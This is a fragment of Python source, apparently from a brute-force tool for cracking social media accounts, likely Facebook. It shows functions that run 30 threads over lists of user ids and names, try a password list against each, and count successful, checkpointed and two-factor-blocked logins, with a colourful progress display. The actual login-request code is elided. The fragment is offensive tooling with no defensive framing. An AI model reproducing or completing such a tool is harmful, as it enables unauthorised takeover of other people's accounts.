...
def india():
                ...
                linex()
                print(' The process has completed')
                print(' Tarmay OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Press enter to back ')
def gmail():
                ...
                with tred(max_workers=30) as ASX:
                        total = str(len(fo))
                        clear()
                        print(' HAMO idakan : \033[1;32m'+total)
                        print("\033[1;32m Brute has been Started")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;36m [\033[1;32mTARMAY\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
